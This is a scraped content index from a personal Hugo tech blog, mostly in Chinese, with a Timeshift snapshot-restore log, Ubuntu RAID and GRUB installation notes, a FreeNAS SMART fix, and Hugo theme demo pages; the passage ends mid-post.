-status_color sss Status bar color -menu_color sss Menu color -prompt_color sss Prompt color -msg_color sss Message color Local options: +nnn Start cursor on specified line -[-]overwrite Overtype mode -[-]hex Hex edit display mode -[-]ansi Hide ANSI mode -[-]title Status line context display mode -[-]autoindent Autoindent mode -[-]wordwrap Word wrap mode -tab nnn Tab width -lmargin nnn Left margin -rmargin nnn Right margin -indentc nnn Indent char -istep nnn Indent step -[-]french French spacing mode -[-]flowed Flowed text mode -[-]highlight Syntax highlighting mode -[-]spaces No tabs mode -[-]crlf CR-LF (MS-DOS) mode -[-]linums Line numbers mode -[-]hiline Highlight cursor line -[-]nobackup No backup mode -[-]rdonly Read only -[-]smarthome Smart home key -[-]indentfirst To indent first -[-]smartbacks Smart backspace -[-]purify Clean up indents -[-]picture Picture mode -syntax sss Syntax -colors sss Scheme -encoding sss Encoding -type sss File type -[-]highlighter_context ^G uses highlighter context -[-]single_quoted ^G ignores \u0026#39;... \u0026#39; -[-]no_double_quoted ^G ignores \u0026#34;... \u0026#34; -[-]c_comment ^G ignores /*...*/ -[-]cpp_comment ^G ignores //... -[-]pound_comment ^G ignores #... -[-]vhdl_comment ^G ignores --... -[-]semi_comment ^G ignores ;... -[-]tex_comment ^G ignores %... -text_delimiters sss Text delimiters -language sss Language -cpara sss Paragraph indent chars -cnotpara sss Non-paragraph chars 2019-03-11 14:09:54 [minion@hqpc074 ~]$ 然後還原到剛剛做的備份，用 \u0026ndash;list 看一下\n2019-03-11 14:11:08 [minion@hqpc074 ~]$ sudo timeshift --list Device : /dev/sda1 UUID : d0efcb3d-e04a-41b8-a046-55557499f4d3 Path : / Mode : RSYNC Device is OK 1 snapshots, 108.3 GB free Num Name Tags Description ------------------------------------------------------------------------------ 0 \u0026gt; 2019-03-11_14-01-01 O after ansible 2019-03-11 14:11:17 [minion@hqpc074 ~]$ 然後還原，中間會問你要不要重新安裝 grub ，就看個人需求，我是都會讓它重新安裝一次啦\n2019-03-11 14:11:53 [minion@hqpc074 ~]$ sudo timeshift --restore --snapshot \u0026#39;2019-03-11_14-01-01\u0026#39; --target /dev/sda1 ****************************************************************************** To restore with default options, press the ENTER key for all prompts! ****************************************************************************** Press ENTER to continue... Re-install GRUB2 bootloader? (recommended) (y/n): y Select GRUB device: Num Device Description ------------------------------------------------------------------------------ 0 \u0026gt; sda ATA TS128GSSD370S [MBR] 1 \u0026gt; sda1 ext4, 128.0 GB GB [ENTER = Default (/dev/sda), a = Abort] Enter device name or number (a=Abort): 0 ****************************************************************************** GRUB Device: /dev/sda ****************************************************************************** ====================================================================== WARNING ====================================================================== Data will be modified on following devices: Device Mount --------- ----- /dev/sda1 / Please save your work and close all applications. System will reboot after files are restored. ====================================================================== DISCLAIMER ====================================================================== This software comes without absolutely NO warranty and the author takes no responsibility for any damage arising from the use of this program. If these terms are not acceptable to you, please do not proceed beyond this point! Continue with restore? (y/n): y Mounted \u0026#39;/dev/sda1\u0026#39; at \u0026#39;/mnt/timeshift/restore/\u0026#39; ****************************************************************************** Backup Device: /dev/sda1 ****************************************************************************** ****************************************************************************** Snapshot: 2019-03-11_14-01-01 ~ after ansible ****************************************************************************** Restoring snapshot... Synching files with rsync... Please do not interrupt the restore process! System will reboot after files are restored .d..t...... etc/ \u0026gt;f.st...... etc/mailcap .d..t...... etc/alternatives/ cLc.t...... etc/alternatives/editor -\u0026gt; /usr/bin/vim.gtk3 cLc.t...... etc/alternatives/editor.1.gz -\u0026gt; /usr/share/man/man1/vim.1.gz cL+++++++++ etc/alternatives/editor.fr.1.gz -\u0026gt; /usr/share/man/fr/man1/vim.1.gz cL+++++++++ etc/alternatives/editor.it.1.gz -\u0026gt; /usr/share/man/it/man1/vim.1.gz cL+++++++++ etc/alternatives/editor.ja.1.gz -\u0026gt; /usr/share/man/ja/man1/vim.1.gz cL+++++++++ etc/alternatives/editor.pl.1.gz -\u0026gt; /usr/share/man/pl/man1/vim.1.gz cL+++++++++ etc/alternatives/editor.ru.1.gz -\u0026gt; /usr/share/man/ru/man1/vim.1.gz .d..t...... home/minion/ .d..t...... mnt/ .d..t...... timeshift/ .d..t...... tmp/ .d..t...... usr/bin/ .d..t...... usr/share/ .d..t...... usr/share/applications/ \u0026gt;f.st...... usr/share/applications/mimeinfo.cache .d..t...... usr/share/doc/ .d..t...... usr/share/man/fr/man1/ cL+++++++++ usr/share/man/fr/man1/editor.1.gz -\u0026gt; /etc/alternatives/editor.fr.1.gz .d..t...... usr/share/man/it/man1/ cL+++++++++ usr/share/man/it/man1/editor.1.gz -\u0026gt; /etc/alternatives/editor.it.1.gz .d..t...... usr/share/man/ja/man1/ cL+++++++++ usr/share/man/ja/man1/editor.1.gz -\u0026gt; /etc/alternatives/editor.ja.1.gz .d..t...... usr/share/man/man1/ .d..t...... usr/share/man/pl/man1/ cL+++++++++ usr/share/man/pl/man1/editor.1.gz -\u0026gt; /etc/alternatives/editor.pl.1.gz .d..t...... usr/share/man/ru/man1/ cL+++++++++ usr/share/man/ru/man1/editor.1.gz -\u0026gt; /etc/alternatives/editor.ru.1.gz .d..t...... usr/share/menu/ .d..t...... var/cache/apt/ \u0026gt;f..t...... var/cache/apt/pkgcache.bin .d..t...... var/cache/apt/archives/ .d..t...... var/cache/apt/archives/partial/ .d..t...... var/cache/man/ \u0026gt;f..t...... var/cache/man/index.db .d..t...... var/cache/man/cs/ .d..t...... var/cache/man/da/ .d..t...... var/cache/man/de/ .d..t...... var/cache/man/el/ .d..t...... var/cache/man/es/ .d..t...... var/cache/man/fi/ .d..t...... var/cache/man/fr.ISO8859-1/ .d..t...... var/cache/man/fr.UTF-8/ .d..t...... var/cache/man/fr/ \u0026gt;f..t...... var/cache/man/fr/index.db .d..t...... var/cache/man/hr/ .d..t...... var/cache/man/hu/ .d..t...... var/cache/man/id/ .d..t...... var/cache/man/it/ \u0026gt;f..t...... var/cache/man/it/index.db .d..t...... var/cache/man/ja/ \u0026gt;f..t...... var/cache/man/ja/index.db .d..t...... var/cache/man/ko/ .d..t...... var/cache/man/nl/ .d..t...... var/cache/man/oldlocal/ .d..t...... var/cache/man/pl/ \u0026gt;f..t...... var/cache/man/pl/index.db .d..t...... var/cache/man/pt/ .d..t...... var/cache/man/pt_BR/ .d..t...... var/cache/man/ro/ .d..t...... var/cache/man/ru/ \u0026gt;f..t...... var/cache/man/ru/index.db .d..t...... var/cache/man/sk/ .d..t...... var/cache/man/sl/ .d..t...... var/cache/man/sr/ .d..t...... var/cache/man/sv/ .d..t...... var/cache/man/tr/ .d..t...... var/cache/man/zh/ .d..t...... var/cache/man/zh_CN/ .d..t...... var/cache/man/zh_TW/ .d..t...... var/lib/apt/ \u0026gt;f..t...... var/lib/apt/extended_states .d..t...... var/lib/dpkg/ \u0026gt;f..t...... var/lib/dpkg/lock \u0026gt;f.st...... var/lib/dpkg/status \u0026gt;f.st...... var/lib/dpkg/status-old .d..t...... var/lib/dpkg/alternatives/ \u0026gt;f.st...... var/lib/dpkg/alternatives/editor .d..t...... var/lib/dpkg/info/ \u0026gt;f..t...... var/lib/dpkg/triggers/Lock .d..t...... var/lib/dpkg/updates/ .d..t...... var/lib/misc/ \u0026gt;f..t...... var/lib/update-notifier/dpkg-run-stamp \u0026gt;f.st...... var/log/alternatives.log \u0026gt;f.st...... var/log/auth.log \u0026gt;f.st...... var/log/dpkg.log \u0026gt;f.st...... var/log/syslog .d..t...... var/log/apt/ \u0026gt;f.st...... var/log/apt/eipp.log.xz \u0026gt;f.st...... var/log/apt/history.log \u0026gt;f.st...... var/log/apt/term.log \u0026gt;f..t...... var/log/journal/8268f4544e414a37ab92123151d94126/system.journal \u0026gt;f..t...... var/log/journal/8268f4544e414a37ab92123151d94126/user-1001.journal .d..t...... var/log/timeshift/ *deleting etc/joe/shell.sh *deleting etc/joe/shell.csh *deleting etc/joe/rjoerc *deleting etc/joe/jstarrc *deleting etc/joe/jpicorc *deleting etc/joe/joerc.zh_TW *deleting etc/joe/joerc *deleting etc/joe/jmacsrc *deleting etc/joe/jicerc.ru *deleting etc/joe/ftyperc *deleting etc/joe/editorrc *deleting etc/joe/ *deleting etc/alternatives/editorrc *deleting usr/bin/rjoe *deleting usr/bin/jstar *deleting usr/bin/jpico *deleting usr/bin/joe *deleting usr/bin/jmacs *deleting usr/share/joe/syntax/yaml.jsf *deleting usr/share/joe/syntax/xml.jsf *deleting usr/share/joe/syntax/whitespace.jsf *deleting usr/share/joe/syntax/vhdl.jsf *deleting usr/share/joe/syntax/verilog.jsf *deleting usr/share/joe/syntax/typescript.jsf *deleting usr/share/joe/syntax/troff.jsf *deleting usr/share/joe/syntax/tex.jsf *deleting usr/share/joe/syntax/tcl.jsf *deleting usr/share/joe/syntax/swift.jsf *deleting usr/share/joe/syntax/sql.jsf *deleting usr/share/joe/syntax/spec.jsf *deleting usr/share/joe/syntax/sml.jsf *deleting usr/share/joe/syntax/skill.jsf *deleting usr/share/joe/syntax/sieve.jsf *deleting usr/share/joe/syntax/sh.jsf *deleting usr/share/joe/syntax/sed.jsf *deleting usr/share/joe/syntax/scala.jsf *deleting usr/share/joe/syntax/rust.jsf *deleting usr/share/joe/syntax/ruby.jsf *deleting usr/share/joe/syntax/rexx.jsf *deleting usr/share/joe/syntax/r.jsf *deleting usr/share/joe/syntax/python.jsf *deleting usr/share/joe/syntax/puppet.jsf *deleting usr/share/joe/syntax/ps.jsf *deleting usr/share/joe/syntax/properties.jsf *deleting usr/share/joe/syntax/prolog.jsf *deleting usr/share/joe/syntax/powershell.jsf *deleting usr/share/joe/syntax/php.jsf *deleting usr/share/joe/syntax/perl.jsf *deleting usr/share/joe/syntax/pascal.jsf *deleting usr/share/joe/syntax/ocaml.jsf *deleting usr/share/joe/syntax/md.jsf *deleting usr/share/joe/syntax/matlab.jsf *deleting usr/share/joe/syntax/mason.jsf *deleting usr/share/joe/syntax/mail.jsf *deleting usr/share/joe/syntax/m4.jsf *deleting usr/share/joe/syntax/lua.jsf *deleting usr/share/joe/syntax/lisp.jsf *deleting usr/share/joe/syntax/json.jsf *deleting usr/share/joe/syntax/jsf_check.jsf *deleting usr/share/joe/syntax/jsf.jsf *deleting usr/share/joe/syntax/js.jsf *deleting usr/share/joe/syntax/joerc.jsf *deleting usr/share/joe/syntax/jcf.jsf *deleting usr/share/joe/syntax/java.jsf *deleting usr/share/joe/syntax/iptables.jsf *deleting usr/share/joe/syntax/ini.jsf *deleting usr/share/joe/syntax/htmlerb.jsf *deleting usr/share/joe/syntax/html.jsf *deleting usr/share/joe/syntax/haskell.jsf *deleting usr/share/joe/syntax/haml.jsf *deleting usr/share/joe/syntax/groovy.jsf *deleting usr/share/joe/syntax/go.jsf *deleting usr/share/joe/syntax/git-commit.jsf *deleting usr/share/joe/syntax/fortran.jsf *deleting usr/share/joe/syntax/filename.jsf *deleting usr/share/joe/syntax/erlang.jsf *deleting usr/share/joe/syntax/erb.jsf *deleting usr/share/joe/syntax/elixir.jsf *deleting usr/share/joe/syntax/dockerfile.jsf *deleting usr/share/joe/syntax/diff.jsf *deleting usr/share/joe/syntax/debian.jsf *deleting usr/share/joe/syntax/debcontrol.jsf *deleting usr/share/joe/syntax/d.jsf *deleting usr/share/joe/syntax/css.jsf *deleting usr/share/joe/syntax/csharp.jsf *deleting usr/share/joe/syntax/csh.jsf *deleting usr/share/joe/syntax/context.jsf *deleting usr/share/joe/syntax/conf.jsf *deleting usr/share/joe/syntax/comment_todo.jsf *deleting usr/share/joe/syntax/coffee.jsf *deleting usr/share/joe/syntax/cobol.jsf *deleting usr/share/joe/syntax/clojure.jsf *deleting usr/share/joe/syntax/c.jsf *deleting usr/share/joe/syntax/batch.jsf *deleting usr/share/joe/syntax/awk.jsf *deleting usr/share/joe/syntax/avr.jsf *deleting usr/share/joe/syntax/asm.jsf *deleting usr/share/joe/syntax/ant.jsf *deleting usr/share/joe/syntax/ada.jsf *deleting usr/share/joe/syntax/4gl.jsf *deleting usr/share/joe/syntax/ *deleting usr/share/joe/lang/zh_TW.po *deleting usr/share/joe/lang/uk.po *deleting usr/share/joe/lang/ru.po *deleting usr/share/joe/lang/fr.po *deleting usr/share/joe/lang/de.po *deleting usr/share/joe/lang/ *deleting usr/share/joe/colors/zenburn.jcf *deleting usr/share/joe/colors/zenburn-hc.jcf *deleting usr/share/joe/colors/xoria.jcf *deleting usr/share/joe/colors/wombat.jcf *deleting usr/share/joe/colors/solarized.jcf *deleting usr/share/joe/colors/molokai.jcf *deleting usr/share/joe/colors/ir_black.jcf *deleting usr/share/joe/colors/gruvbox.jcf *deleting usr/share/joe/colors/default.jcf *deleting usr/share/joe/colors/ *deleting usr/share/joe/charmaps/klingon *deleting usr/share/joe/charmaps/ *deleting usr/share/joe/ *deleting usr/share/applications/jstar.desktop *deleting usr/share/applications/jpico.desktop *deleting usr/share/applications/joe.desktop *deleting usr/share/applications/jmacs.desktop *deleting usr/share/doc/joe/man.md *deleting usr/share/doc/joe/help.pl.txt *deleting usr/share/doc/joe/hacking.md *deleting usr/share/doc/joe/copyright *deleting usr/share/doc/joe/changelog.Debian.gz *deleting usr/share/doc/joe/README.old *deleting usr/share/doc/joe/README.md *deleting usr/share/doc/joe/README.Debian *deleting usr/share/doc/joe/NEWS.md *deleting usr/share/doc/joe/ *deleting usr/share/man/man1/rjoe.1.gz *deleting usr/share/man/man1/jstar.1.gz *deleting usr/share/man/man1/jpico.1.gz *deleting usr/share/man/man1/joe.1.gz *deleting usr/share/man/man1/jmacs.1.gz *deleting usr/share/man/ru/man1/joe.1.gz *deleting usr/share/menu/joe *deleting var/lib/dpkg/info/joe.prerm *deleting var/lib/dpkg/info/joe.preinst *deleting var/lib/dpkg/info/joe.postrm *deleting var/lib/dpkg/info/joe.postinst *deleting var/lib/dpkg/info/joe.md5sums *deleting var/lib/dpkg/info/joe.list *deleting var/lib/dpkg/info/joe.conffiles *deleting var/lib/misc/editorrc sent 122,966,173 bytes received 829 bytes 35,133,429.14 bytes/sec total size is 7,201,040,584 speedup is 58.56 Re-installing GRUB2 bootloader... Installing for i386-pc platform. Installation finished. No error reported. Updating GRUB menu... Generating grub configuration file ... Warning: Setting GRUB_TIMEOUT to a non-zero value when GRUB_HIDDEN_TIMEOUT is set is no longer supported. Found linux image: /boot/vmlinuz-4.15.0-20-generic Found initrd image: /boot/initrd.img-4.15.0-20-generic Found memtest86+ image: /boot/memtest86+.elf Found memtest86+ image: /boot/memtest86+.bin done Synching file systems... Rebooting system... Rebooting. 要特別注意，restore完後，會自動reboot\n重新開機完成後，就入系統，執行看看 joe\n2019-03-11 14:14:53 [minion@hqpc074 ~]$ joe Command \u0026#39;joe\u0026#39; not found, but can be installed with: sudo apt install joe sudo apt install joe-jupp 2019-03-11 14:14:54 [minion@hqpc074 ~]$ 可以看到，剛剛安裝的joe 又變成還沒安裝的狀態了，符合預期中的結果！\n可以繼續測試playbook了！\n","date":"2019-03-11T14:02:30+08:00","permalink":"https://h.cowbay.org/post/install-timeshift-on-ubuntu1804/","title":"Install Timeshift on Ubuntu1804"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://h.cowbay.org/post/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://h.cowbay.org/post/markdown-syntax/","title":"Markdown Syntax Guide"},{"content":"Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode Twitter Simple Shortcode “In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”\n— Jan Tschichold pic.twitter.com/gcv7SrhvJb\n\u0026mdash; Graphic Design History (@DesignReviewed) January 17, 2019 Vimeo Simple Shortcode bilibilibi Shortcode Gist Shortcode Gitlab Snippets Shortcode Quote Shortcode Stack adds a quote shortcode. For example:\nLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― A famous person, The book they wrote Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Anonymous book Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Some book Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Somebody","date":"2019-03-10T00:00:00Z","permalink":"https://h.cowbay.org/post/rich-content/","title":"Rich Content"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://h.cowbay.org/post/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n.emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; }","date":"2019-03-05T00:00:00Z","image":"https://h.cowbay.org/post/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://h.cowbay.org/post/emoji-support/","title":"Emoji Support"},{"content":"買了一張 DELL 6/iR 低階的raid 卡\n來測試把系統裝在硬體做的RAID上，結果沒想到居然不能開機\u0026hellip;\n都2019年了， DELL 6/iR 這張卡出了快十年了，不懂為什麼在安裝過程都正常\n但是裝完之後，都會發生 \u0026quot; no boot device \u0026ldquo;的錯誤\n測試過 ubuntu 16.04 / 18.04 , Debian 9 都是一樣的問題\n翻了很久google，發現有人提到要修改一個grub的設定\n先裝完系統，然後改用 ubuntu 18.04 Live DVD 開機\n然後開啟 terminal\n依序執行\nsudo mount /dev/sdf1 /mnt (RAID磁碟代號不一定是 /dev/sdf 先用fdisk -l 確認) sudo mount --bind /dev /mnt/dev sudo mount --bind /proc /mnt/proc sudo mount --bind /sys /mnt/sys sudo chroot /mnt chroot 完成之後，再進行下面的修改\nvi /etc/default/grub 找到 GRUB_CMDLINE_LINUX=\u0026#34;\u0026#34; 修改成 GRUB_CMDLINE_LINUX=\u0026#34;rootdelay=90\u0026#34; 存檔後離開，再更新 grub\nupdate-grub 然後重新開機，開機時間會比較久一點，但是這樣就可以正常開機了。\n還是不懂，這到底是 ubuntu的問題，還是raid Controller的問題？還是 grub 的問題？\n","date":"2019-01-16T16:17:05+08:00","permalink":"https://h.cowbay.org/post/install-ubuntu1804-on-dell-6ir-raid-controller/","title":"用DELL 6 i/R 建立RAID，並在上面安裝ubuntu 18.04 "},{"content":"最近在弄一台機器，想要把ubuntu 18.04 安裝在software raid上\n因為新開的機器大部分都是在proxmox上，所以很少碰實體機器了\n結果在安裝過程中，做raid碰到一些問題，來紀錄一下\n要先說明 Ubuntu 提供的ISO類型，這會牽涉到後續裝raid\n底下這是ubuntu 網頁上的ISO列表\n大致上分為 Desktop/live-server 兩種\n因為我要裝的是server，所以我一開始當然是選live-server\n但是用這個ISO開機，要設定software raid時，會出現警告訊息\n提示不可以把所有的分割區都指定給 RAID/LVM ，這樣會沒有地方可以放 /boot\n錯誤如圖\n所以我很「鄉愿」的，那就切一個/boot 給它用，算是暫時解決這問題 XD\n但是這樣的作法，總有一天會出事\n因為如果這個 /boot 掛了，雖然底下的系統有做mirror\n但還是不能開機，那這樣做raid根本沒有意義啊！\n所以研究了兩天，發現一個很重要的事情\n我根本就抓錯ISO了啊！！！！！！！\n會這樣想是因為中間有其他task在裝debian9\n一開始也是抓live-dvd版本\n但是這個版本沒有辦法自訂要安裝哪些套件，所以預設安裝完會包含windows manager、office、字型等等\n加起來總共5.x G \u0026hellip;.\n然後我還要手動移除這些套件，這不是脫褲子放屁嗎？\n翻了一下google，發現是因為ISO的關係，要去下載netinst的ISO\n才能在安裝過程中自訂套件\n從這邊延伸到ubuntu的問題\n會不會是我也抓錯ISO了呢？\n再次google相關訊息，果然ubuntu也有類似的netboot ISO\n檔案很小，只有60M左右，趕快下載來安裝！\n這次果然可以在安裝過程中，順利設定software raid，並且掛載在 / 根目錄底下進行安裝\nBUT \u0026hellip;. 對，永遠少不了這個BUT 安裝過程會卡住\u0026hellip;\n卡在這邊幾個小時了，都不會動\n我在猜可能是mirror site 有問題，所以抓套件抓不到就卡住了？\n一直卡著也不是辦法，於是又去ubuntu官網看了一下，發現有另外一個server的 ISO\n這個叫 \u0026ldquo;Alternative Ubuntu Server installer\u0026rdquo;\n在官網的這個位置\nhttps://www.ubuntu.com/download/alternative-downloads\n進入後，會有個列表，找到 server amd64 的ISO，這個才是正確的\n和第一次不同的是，這個沒有\u0026quot;live\u0026quot; ，很重要！\n用這個ISO開機，就可以正常的做出software raid，並且指定安裝作業系統，也不會有卡住的狀況\n做出來的系統磁區大概是這樣 這台VM的硬碟是透過10G網卡連到一個四塊Sandisk 240G SSD 組成的raid0空間\n順便看一下速度 10G就是快！就是爽！\n爽完之後，還是要確認一下\u0026hellip; 首先先執行 sudo dpkg-reconfigure grub-pc\n看看是不是兩顆硬碟都有裝 grub ，這樣萬一有一顆硬碟故障，另一顆才能啟動\n看來因為是在安裝過程中，就指定了要把系統裝在raid上，所以ubuntu很聰明的，也自動把grub裝在兩顆硬碟上了\n來試試看拔掉一顆硬碟還能不能正常運作\n直接在proxmox 管理界面中，detach 一顆硬碟\n果然報錯誤了\n重開機看看，也沒有問題，可以順利開機！\n開機過程有看到raid 只剩下一顆在運作的訊息\n再來把硬碟加回去\n然後用mdadm 指令加入分割區，raid就會開始rebuid了\n所以，如果有打算要做software raid來安裝ubuntu 作業系統的，一開始就要選對ISO\n才不會白忙那麼多時間啊！\n","date":"2019-01-16T09:58:50+08:00","permalink":"https://h.cowbay.org/post/ubuntu-1804-install-root-on-raid/","title":"Ubuntu 1804 Install Root on Raid"},{"content":"這兩天在弄兩台Freenas ，準備當作Proxmox 的Storage \u0026amp; Server Backup\n因為伺服器的限制，只能接六個SATA，我接了六個2T的硬碟做raid10\n然後把Freenas 安裝在隨身碟上\n不過會一直出現Smartd failed to start 的錯誤訊息\n翻了一下論壇，發現因為系統安裝在隨身碟上\n然後預設會開啟隨身碟的smart\n可是這樣反而會造成錯誤\n所以只要去 Storage \u0026ndash;\u0026gt; View Disks 找到隨身碟的代號\n然後點兩下進去編輯，把 enable S.M.A.R.T 關閉\n接著再去啟動 SMART ，就不會有錯誤訊息了\n","date":"2018-12-13T17:40:20+08:00","permalink":"https://h.cowbay.org/post/smartd-failed-to-start-in-freenas/","title":"[筆記] Freenas Smartd 啟動失敗 Smartd Failed to Start in Freenas"},{"content":"最近在做一台老機器的P2V\n偏偏user說不能關機，所以我用dd + ssh 做線上移轉\n這部份有空再來寫\n只是因為原來的設定有用mdadm 做raid1\n這部份導致移轉過去proxmox 後，會出現raid degrade 導致無法正常開機\n我的想法是既然開機會出現raid degrade\n那我就加第二顆硬碟給它，讓它做 rebuild\nOK，原則上這樣做沒有問題\n問題是它X的，這個mdadm rebuild 的速度也未免太慢了吧！\nEvery 2.0s: cat /proc/mdstat Wed Dec 12 11:01:36 2018 Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] md1 : active raid1 sda1[0] sdb1[2] 975296 blocks super 1.2 [2/2] [UU] md0 